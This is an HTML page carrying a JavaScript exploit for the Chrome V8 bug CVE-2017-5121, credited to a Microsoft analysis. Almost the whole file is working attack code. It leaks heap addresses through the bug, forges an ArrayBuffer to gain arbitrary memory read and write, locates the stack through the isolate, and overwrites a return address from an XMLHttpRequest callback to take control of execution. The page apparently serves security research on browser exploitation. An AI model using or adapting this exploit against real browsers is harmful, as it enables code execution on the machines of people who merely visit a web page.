<html>
<head>
   <meta http-equiv="pragma" content="no-cache" />
   <meta http-equiv="Cache-Control" content="no-store, must-revalidate" />
   <meta http-equiv="expires" content="0" />
</head>
<body>
  <div id="dlog" />
<script>
function print(s) {
   //console.log(s);
   document.getElementById("dlog").innerHTML += s +"<br />"
}

// based on Long.js by dcodeIO
// https://github.com/dcodeIO/Long.js
// License Apache 2
class _u64 {
   constructor(hi, lo) {
      this.lo_ = lo;
      this.hi_ = hi;
   }

   hex() {
      var hlo = (this.lo_ < 0 ? (0xFFFFFFFF + this.lo_ + 1) : this.lo_).toString(16)
      var hhi = (this.hi_ < 0 ? (0xFFFFFFFF + this.hi_ + 1) : this.hi_).toString(16)
      if(hlo.substr(0,2) == "0x") hlo = hlo.substr(2,hlo.length);
      if(hhi.substr(0,2) == "0x") hhi = hhi.substr(2,hji.length);
      hlo = "00000000" + hlo
      hlo = hlo.substr(hlo.length-8, hlo.length);
      return "0x" + hhi + hlo;
   }

   isZero() {
      return this.hi_ == 0 && this.lo_ == 0;
   }

   equals(val) {
      return this.hi_ == val.hi_ && this.lo_ == val.lo_;
   }

   and(val) {
      return new _u64(this.hi_ & val.hi_, this.lo_ & val.lo_);
   }

   add(val) {
      var a48 = this.hi_ >>> 16;
      var a32 = this.hi_ & 0xFFFF;
      var a16 = this.lo_ >>> 16;
      var a00 = this.lo_ & 0xFFFF;

      var b48 = val.hi_ >>> 16;
      var b32 = val.hi_ & 0xFFFF;
      var b16 = val.lo_ >>> 16;
      var b00 = val.lo_ & 0xFFFF;

      var c48 = 0, c32 = 0, c16 = 0, c00 = 0;
      c00 += a00 + b00;
      c16 += c00 >>> 16;
      c00 &= 0xFFFF;
      c16 += a16 + b16;
      c32 += c16 >>> 16;
      c16 &= 0xFFFF;
      c32 += a32 + b32;
      c48 += c32 >>> 16;
      c32 &= 0xFFFF;
      c48 += a48 + b48;
      c48 &= 0xFFFF;

      return new _u64((c48 << 16) | c32, (c16 << 16) | c00);
   }

   addi(h,l) {
      return this.add(new _u64(h,l));
   }

   subi(h,l) {
      return this.sub(new _u64(h,l));
   }

   not() {
      return new _u64(~this.hi_, ~this.lo_)
   }

   neg() {
      return this.not().add(new _u64(0,1));
   }

   sub(val) {
      return this.add(val.neg());
   };

   swap32(val) {
      return ((val & 0xFF) << 24) | ((val & 0xFF00) << 8) |
            ((val >> 8) & 0xFF00) | ((val >> 24) & 0xFF);
   }

   bswap() {
      var lo = swap32(this.lo_);
      var hi = swap32(this.hi_);
      return new _u64(lo, hi);
   };
}
var u64 = function(hi, lo) { return new _u64(hi,lo) };
var u64_from_hex_string = function(a) {
   return u64(parseInt(a.substr(0,a.length-8), 16), parseInt(a.substr(-8), 16));
};

function hex2float(h) {
   return h * 4.9406564584124654E-324;
}

function float2hex(h) {
   return h / 4.9406564584124654E-324;
}

//
// Exploit for CVE-2017-5121, PoC and excellent analysis of the bug can be found at
// https://cloudblogs.microsoft.com/microsoftsecure/2017/10/18/browser-security-beyond-sandboxing/
//
var ab1 = new ArrayBuffer(0x13004);
var ab2 = new ArrayBuffer(0x13008);
var ab1_buffer_addr = null;
var ab1_js_arr_addr = null;
var ab2_buffer_addr = null;
var ab2_js_arr_addr = null;
var done = false;
var ab = ab1;

u32b = new Uint32Array(ab1);
var tw32 = function(off,v32) {
   u32b[off/4] = v32;
}
var tw64 = function(off, v64) {
   u32b[off/4] = v64.lo_;
   u32b[off/4+1] = v64.hi_;
}

//
// leak buffer address and backing object of ArrayBuffers
//
var inf0leak = function(f) {
   var o1 = {
      a1 : {},
      b1 : {
               b1b1 : {},
               b1c1 : {b1c1a1: {b1c1a1a1: 0, b1c1a1b1: 0, b1c1a1c1: this} },
               ob01 :0 , ob02 :0 , ob03 :0 , ob04 :0 , ob05 :0 , ob06 :0 ,
               ob07 :0 , ob08 :0 , ob09 :0 , ob10 :0 , ob11 :0 , ob12 :0 ,
               ob13 :0 , ob14 :0 , ob16 :0 , ob17 :0 , ob18 :0 , ob19 :0 ,
               ob20 :0 , ob21 :0 , ob22 :0 , ob23 :0 , ob24 :0 , ob25 :0 ,
               b1a1 : { 
                  spra1y : [ab,ab,ab,ab,ab,ab,ab,ab,ab,ab,ab], 
                  b1a1b11: 1.2, 
                  t00:{},t01:{},t02:{},t03:{},t04:{},t05:{},t06:{},t07:{},
                  t10:{},t11:{},t12:{},t13:{},t14:{},t15:{},t16:{},t17:{},
                  t20:{},t21:{},t22:{},t23:{},t24:{},t25:{},t26:{},t27:{},
                  t30:{},t31:{},t32:{},t33:{},t34:{},t35:{},t36:{},t37:{},
                  t40:{},t41:{},t42:{},t43:{},t44:{},t45:{},t46:{},t47:{},
                  t50:{},t51:{},
                  b1a1b12:1.2
               },
      }
   };
   o1.b1.b1c1.b1c1a1.b1c1a1b1 = 0x424242420;
   o1.b1.b1b1.b1c1a1 = f(o1.b1.b1a1.b1a1b11,o1.b1.b1a1.b1a1b12);
}

//
// perform leak for ab1
//
while(!done) {
   inf0leak(function(a1, a2) {
         if(a1 != 1.2) {
            ab1_buffer_addr = float2hex(a1);
            ab1_js_arr_addr = float2hex(a2);
            //print("[+] ab1_buffer_addr: " + ab1_buffer_addr.toString(16));
            //print("[+] ab1_js_arr_addr: " + ab1_js_arr_addr.toString(16));
            done = true;
         }
      }
   )
}
//
// perform leak for ab2
//
ab = ab2;
done=false;
while(!done) {
   inf0leak(function(a1, a2) {
         if(a1 != 1.2) {
            ab2_buffer_addr = float2hex(a1);
            //print("[+] ab2_buffer_addr: " + ab2_buffer_addr.toString(16));
            done = true;
         }
      }
   )
}

//
// convert to u64 objects for easier usage
//
u64_ab1_buffer_addr = u64_from_hex_string(ab1_buffer_addr.toString(16));
u64_ab1_js_arr_addr = u64_from_hex_string(ab1_js_arr_addr.toString(16)).subi(0,1);
u64_ab2_buffer_addr = u64_from_hex_string(ab2_buffer_addr.toString(16));
u64_ab2_js_arr_addr = u64_ab1_js_arr_addr.addi(0,0x50);

//
// Create fake ArrayBuffer/DataView (see MS blog post)
//
tw64(0x28, u64_ab1_buffer_addr.addi(0,0x100 + 1));
tw64(0x100 + 0x00, u64_ab1_buffer_addr.addi(0, 0x200 + 1));
tw64(0x100 + 0x08, u64_ab1_buffer_addr.addi(0, 0x200 + 1));
tw64(0x100 + 0x18, u64_ab1_buffer_addr.addi(0, 0x300 + 1));
tw64(0x100 + 0x20, u64(0,0));
tw64(0x100 + 0x28, u64(0x2000,0));

tw32(0x200 + 0x0c, 0x1000c5);

tw64(0x300 + 0x20, u64_ab1_js_arr_addr.addi(0,0x20));


//
// trigger CVE-2017-5121 again to overwrite the buffer address of ab1
// this allows us then to manipulate the buffer address of ab2, which
// we then can use to read/write arbitrary memory
//
var fake_ab = hex2float(ab1_buffer_addr+1);
var prepare_ab1_hi = function(f) {
   var o = {
      a : {},
      b : {
         bc : {
            bca: [fake_ab, fake_ab, fake_ab, fake_ab, fake_ab, fake_ab, fake_ab, fake_ab, fake_ab, fake_ab, fake_ab, fake_ab, fake_ab],
            oo1 : 1.2,
            oo2 : {},
         },
         ba : {},
         bb : {bba: {bbaa: 0, bbab: 0, bbac: this} },
      },
   };
   o.b.bb.bba.bbab = 0;
   o.b.ba.bca = f(o.b.bc.oo1, o.b.bc.oo2);
}

done =false;
while(!done) {
   prepare_ab1_hi( function(a1, a2) {
         if(a1 != 1.2) {
            DataView.prototype.setUint32.apply(a2, [0, u64_ab1_js_arr_addr.lo_, true]);
            DataView.prototype.setUint32.apply(a2, [4, u64_ab1_js_arr_addr.hi_, true]);
            done = true;
         }
      }
   )
}

//
// defining rw primitives
//
var dv_ab1 = new DataView(ab1);
var dv_ab2 = new DataView(ab2);

var set_ab2_addr = function(u64_addr) {
   DataView.prototype.setUint32.apply(dv_ab1, [0x50+0x20, u64_addr.lo_, true]);
   DataView.prototype.setUint32.apply(dv_ab1, [0x50+0x24, u64_addr.hi_, true]);
}

var r64 = function(u64_addr) {
   set_ab2_addr(u64_addr);
   var rl = DataView.prototype.getUint32.apply(dv_ab2, [0, true]);
   var rh = DataView.prototype.getUint32.apply(dv_ab2, [4, true]);
   var r64t = u64(rh, rl);
   return r64t;
}

var w64 = function(u64_addr, u64_val) {
   set_ab2_addr(u64_addr);
   DataView.prototype.setUint32.apply(dv_ab2, [0, u64_val.lo_, true]);
   DataView.prototype.setUint32.apply(dv_ab2, [4, u64_val.hi_, true]);
}


//
// Leak address of isolate for disclosing a valid stack address
// 
var isolate = r64(u64_ab1_js_arr_addr);
isolate = isolate.and(u64(0xFFFFFFFF, 0xFFF80000));
isolate = r64(isolate.addi(0,0x38));
isolate = isolate.and(u64(0xFFFFFFFF, 0xFFFFFFC0));
print("[+] isolate: " + isolate.hex());

var xhr = new XMLHttpRequest();

//
// thread_local_top_ contains pointer to the stack 
//
var thread_local_top_ = isolate.addi(0,0x18D0);

var xhr_delay = function(e) {
   print('[+] thread_local_top_ ' + thread_local_top_.hex());
   var c_entry_fp_ = r64(thread_local_top_.addi(0,0x70));
   var handler_    = r64(thread_local_top_.addi(0,0x78));

   //
   // stack frame of blink::EventTarget::FireEventListeners(blink::Event *,blink::EventTargetData *,blink::HeapVector<blink::RegisteredEventListener,1ul> &)
   //
   var stack = c_entry_fp_.addi(0,0x9A0);
   var ret_stack_addr = stack.addi(0,0x38);
   w64(ret_stack_addr, u64(0x4141, 0x4141));
}

xhr.onreadystatechange = xhr_delay;
xhr.open("GET", "c0ffee", true);
</script>
</body>
</html>
